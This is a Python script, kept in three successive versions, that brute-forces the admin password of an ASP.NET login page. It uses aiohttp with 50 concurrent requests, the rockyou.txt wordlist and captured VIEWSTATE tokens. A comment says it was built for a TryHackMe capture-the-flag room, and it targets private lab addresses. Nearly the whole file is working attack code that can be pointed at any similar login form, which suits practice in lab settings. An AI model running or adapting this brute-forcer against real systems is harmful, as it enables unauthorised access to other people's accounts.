# import aiohttp
# import asyncio
# import time
# import json
# import os

# """
# v1.0.1
# testedin python 3.10.6
# pip3 install aiohttp
# """

# async def post(session, index, FUZZ, filter, semaphore):
#     # payload = {"email": f"demo_atk+{i}@email.com", "password": "s3cur3_th1s_sh1t"}
#     payload = {
#         '__VIEWSTATE': 'FtDWXBorgd5PnS3Zm/OOFb8G6Z+z2Di8+D6C2nXaT0BXEV77JRgpiq0q4001bzaa1xC9v1tu0/eGq7NVZPeYx+rPqeBIUqcVJ5jflfJ6itd1+jhXLZQ/vl8xJBL355kPh4lIx6Bl8b+Uj6EV7eNFRo5k0V9CnfiEjXF64Dt7AzovFM5b',
#         '__EVENTVALIDATION': 'WdQGNjnu0klLhxIo2w/iePIaOG7I6V4l/dJujt8W5v5HUCOWh68wRWrYoiMhQw1SK5jE/bSl+bj0ptVZ1Iq4eoV/5WlyvRLnmJ/kEXa7S8CyBGEUisnGk1u0rXPd/zQhXbzFNQHnRYefaH3240eaNeKrgUR+iyALg9mq63v+/PlaUQzn',
#         'ctl00$MainContent$LoginUser$UserName': 'admin',
#         'ctl00$MainContent$LoginUser$Password': FUZZ,
#         'ctl00$MainContent$LoginUser$LoginButton': 'Log in',
#     }

#     headers = {
#         'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:127.0) Gecko/20100101 Firefox/127.0',
#         'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
#         'Accept-Language': 'en-US,en;q=0.5',
#         # 'Accept-Encoding': 'gzip, deflate',
#         'Content-Type': 'application/x-www-form-urlencoded',
#         'Origin': 'http://10.10.151.23',
#         'Connection': 'keep-alive',
#         'Referer': 'http://10.10.151.23/Account/login.aspx?ReturnURL=%2fadmin%2f',
#         'Upgrade-Insecure-Requests': '1',
#         'Priority': 'u=1',
#     }
#     async with semaphore:
#         try:
#             async with session.post(
#                 # url, data=json.dumps(payload), headers=headers
#                 url, data=payload, headers=headers # Use Dictionary  if 'Content-Type': 'application/x-www-form-urlencoded',

#             ) as response:
#                 #print(i, response.status, await response.text())
#                 text = await response.text()

#                 if filter in text:
#                     response.status = 401
#                     status = 'Failed '
#                 else:
#                     status = 'CHECK THIS!'
#                     print(text)
#                     print(f"FUZZ: {FUZZ}")
#                     exit(1)

#                 print(index, response.status, status)
                
#                 return response.status

#         except Exception as e:
#             print(f"[-] Request failed: {e}")
#             return None




# def read_file_to_array(file_path):
#     # Expand the ~ to the full path
#     expanded_path = os.path.expanduser(file_path)
    
#     try:
#         with open(expanded_path, 'r', encoding='latin-1') as file:  # Using 'latin-1' encoding
#             lines = file.readlines()
#         return [line.strip() for line in lines]
#     except Exception as e:
#         print(f"Error reading file: {e}")
#         return []

# async def main(number_of_requests=1000):
#     file_path = "~/wordlists/rockyou.txt"
#     # file_path = "~/wordlists/test.txt"
#     password_list = read_file_to_array(file_path)
#     filter_string = "Login failed"
#     concurrent_limit = 50 # adjust based on your system's capability
#     semaphore = asyncio.Semaphore(concurrent_limit)

#     tasks = []
#     async with aiohttp.ClientSession() as session:
#         for i in range(len(password_list)):
#             task = asyncio.ensure_future(post(
#                 session=session, index=i ,FUZZ=password_list[i], filter=filter_string,semaphore=semaphore
#                 ))
#             tasks.append(task)
#         responses = await asyncio.gather(*tasks)
#         return responses


# if __name__ == "__main__":
#     # url = "http://192.168.254.109:2368/"
#     url = "http://10.10.151.23/Account/login.aspx?ReturnURL=%2fadmin%2f"
#     number_of_requests = 1000
    

#     start_time = time.time()
#     print(f"[+] {number_of_requests} Requests")
#     responses = asyncio.run(main())
#     print("--- %s seconds ---" % (time.time() - start_time))

#     success = len([r for r in responses if r and r // 100 == 2])
#     server = len([r for r in responses if r and r // 100 == 5])
#     error = len([r for r in responses if r and r // 100 == 4])

#     print("success: ", success)
#     print("server errors: ", server)
#     print("client errors: ", error)

"""
THIS VERSION IS WORKING BUT IT TAKES TOO LONG 
the script is taking a long time to print anything because it's waiting for all tasks to complete before printing the results
"""


# ============================================================================================================
# VERSION 2
# ============================================================================================================
# import aiohttp
# import asyncio
# import time
# import os

# """
# v1.0.1
# tested in python 3.10.6
# pip3 install aiohttp
# """

# async def post(session, index, FUZZ, filter, semaphore):
#     payload = {
#         '__VIEWSTATE': 'FtDWXBorgd5PnS3Zm/OOFb8G6Z+z2Di8+D6C2nXaT0BXEV77JRgpiq0q4001bzaa1xC9v1tu0/eGq7NVZPeYx+rPqeBIUqcVJ5jflfJ6itd1+jhXLZQ/vl8xJBL355kPh4lIx6Bl8b+Uj6EV7eNFRo5k0V9CnfiEjXF64Dt7AzovFM5b',
#         '__EVENTVALIDATION': 'WdQGNjnu0klLhxIo2w/iePIaOG7I6V4l/dJujt8W5v5HUCOWh68wRWrYoiMhQw1SK5jE/bSl+bj0ptVZ1Iq4eoV/5WlyvRLnmJ/kEXa7S8CyBGEUisnGk1u0rXPd/zQhXbzFNQHnRYefaH3240eaNeKrgUR+iyALg9mq63v+/PlaUQzn',
#         'ctl00$MainContent$LoginUser$UserName': 'admin',
#         'ctl00$MainContent$LoginUser$Password': FUZZ,
#         'ctl00$MainContent$LoginUser$LoginButton': 'Log in',
#     }

#     headers = {
#         'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:127.0) Gecko/20100101 Firefox/127.0',
#         'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
#         'Accept-Language': 'en-US,en;q=0.5',
#         'Content-Type': 'application/x-www-form-urlencoded',
#         'Origin': 'http://10.10.151.23',
#         'Connection': 'keep-alive',
#         'Referer': 'http://10.10.151.23/Account/login.aspx?ReturnURL=%2fadmin%2f',
#         'Upgrade-Insecure-Requests': '1',
#         'Priority': 'u=1',
#     }
    
#     async with semaphore:
#         try:
#             async with session.post(url, data=payload, headers=headers) as response:
#                 text = await response.text()
#                 if filter in text:
#                     response.status = 401
#                     status = 'Failed'
#                 else:
#                     status = 'CHECK THIS!'
#                     print(text)
#                     print(f"FUZZ: {FUZZ}")
#                     exit(1)

#                 print(index, response.status, status)
#                 return response.status
#         except Exception as e:
#             print(f"[-] Request failed: {e}")
#             return None

# def read_file_to_array(file_path):
#     expanded_path = os.path.expanduser(file_path)
#     try:
#         with open(expanded_path, 'r', encoding='latin-1') as file:
#             lines = file.readlines()
#         return [line.strip() for line in lines]
#     except Exception as e:
#         print(f"Error reading file: {e}")
#         return []

# async def main(number_of_requests=1000):
#     file_path = "~/wordlists/rockyou.txt"
#     password_list = read_file_to_array(file_path)
#     filter_string = "Login failed"
#     concurrent_limit = 50
#     semaphore = asyncio.Semaphore(concurrent_limit)

#     tasks = []
#     async with aiohttp.ClientSession() as session:
#         for i in range(len(password_list)):
#             task = asyncio.ensure_future(post(session=session, index=i, FUZZ=password_list[i], filter=filter_string, semaphore=semaphore))
#             tasks.append(task)

#         for task in asyncio.as_completed(tasks):
#             response = await task
#             if response and response // 100 == 2:
#                 print("Success:", response)
#             elif response and response // 100 == 5:
#                 print("Server error:", response)
#             elif response and response // 100 == 4:
#                 print("Client error:", response)

# if __name__ == "__main__":
#     url = "http://10.10.151.23/Account/login.aspx?ReturnURL=%2fadmin%2f"
#     number_of_requests = 1000
    
#     start_time = time.time()
#     print(f"[+] {number_of_requests} Requests")
#     asyncio.run(main())
#     print("--- %s seconds ---" % (time.time() - start_time))
"""
works but still slow
"""

# ============================================================================================================
# VERSION 3
# ============================================================================================================
import aiohttp
import asyncio
import time
import os

"""
v1.0.1
tested in python 3.10.6
pip3 install aiohttp
"""

async def post(session, index, FUZZ, filter, semaphore):
    """
    in your browser inspect element, then get the request and copy it as curl.
    then go to https://curlconverter.com/python/

    get the body and the headers, replace the previous below
    """
    url = "http://10.10.128.199/Account/login.aspx?ReturnURL=%2fadmin%2f"

    headers = {
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
        'Accept-Language': 'en-US,en',
        'Cache-Control': 'max-age=0',
        'Connection': 'keep-alive',
        'Content-Type': 'application/x-www-form-urlencoded',
        'Origin': 'http://10.10.128.199',
        'Referer': 'http://10.10.128.199/Account/login.aspx?ReturnURL=/admin/',
        'Sec-GPC': '1',
        'Upgrade-Insecure-Requests': '1',
        'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36',
    }

    payload = {
        '__VIEWSTATE': 'jZtE7wqYwR3zrMFIyFbn6B4tvy7Ttka/xpq49sTp+nEK3L+47GFuN+ytRS6ApURWP8RHkvcUytQnp8a49zizvXobE9LH6413hEAAXe4ngkuIeupIcu0Sb3Qs0Y+gGm2bZs7v7zvExuPHhWd7bcjzo3Bpi+QBVFYDg3EIhqZLzodq201x',
        '__EVENTVALIDATION': '144pnMKBET51z6TC+tbrM1/prBnBdwpO71xsdCS67jfZ48p6n0al+YdxsFYmhlkffqv7u7ZvSrvki2MS9Y0EtYJJO/BUNU09rfjqsFRzbBH1SCNJg/Q2VXkug9rsV/1ULEjtza66dRyKvGIEd0pbTLGOH1zf5sYB8/RbrTcdyGipBUt8',
        'ctl00$MainContent$LoginUser$UserName': 'admin',
        'ctl00$MainContent$LoginUser$Password': FUZZ,
        'ctl00$MainContent$LoginUser$LoginButton': 'Log in',
    }
    """
    HTTP FORMS
    'Content-Type': 'application/x-www-form-urlencoded',
    should use dictionary as payload
    """
    
    async with semaphore:
        try:
            async with session.post(url, data=payload, headers=headers) as response:
                text = await response.text()
                if filter in text:
                    response.status = 401
                    status = 'Failed'
                else:
                    status = 'CHECK THIS!'
                    print(text)
                    print(f"FUZZ: {FUZZ}")
                    os._exit(1)  # Exit the program immediately

                print(index, response.status, status)
                return response.status
        except Exception as e:
            print(f"[-] Request failed: {e}")
            return None

def read_file_to_array(file_path):
    expanded_path = os.path.expanduser(file_path)
    try:
        with open(expanded_path, 'r', encoding='latin-1') as file:
            lines = file.readlines()
        return [line.strip() for line in lines]
    except Exception as e:
        print(f"Error reading file: {e}")
        return []

async def main():
    file_path = "~/wordlists/rockyou.txt"
    password_list = read_file_to_array(file_path)
    filter_string = "Login failed"
    concurrent_limit = 50
    semaphore = asyncio.Semaphore(concurrent_limit)

    tasks = []
    async with aiohttp.ClientSession() as session:
        for i in range(0, len(password_list), concurrent_limit):
            batch = password_list[i:i + concurrent_limit]
            for j, password in enumerate(batch):
                task = asyncio.ensure_future(post(
                    session=session, index=i + j, FUZZ=password, filter=filter_string, semaphore=semaphore
                ))
                tasks.append(task)

            responses = await asyncio.gather(*tasks)
            # for response in responses:
            #     if response:
            #         if response // 100 == 2:
            #             print("Success:", response)
            #         elif response // 100 == 5:
            #             print("Server error:", response)
            #         elif response // 100 == 4:
            #             print("Client error:", response)
            tasks = []  # Clear tasks for the next batch

if __name__ == "__main__":
    # https://tryhackme.com/r/room/hackpark
    # this is the room we tried this
    # url = "http://10.10.151.23/Account/login.aspx?ReturnURL=%2fadmin%2f"
    url= "http://10.10.128.199/Account/login.aspx?ReturnURL=%2fadmin%2f"
    start_time = time.time()
    print("[+] Starting requests")
    asyncio.run(main())
    print("--- %s seconds ---" % (time.time() - start_time))
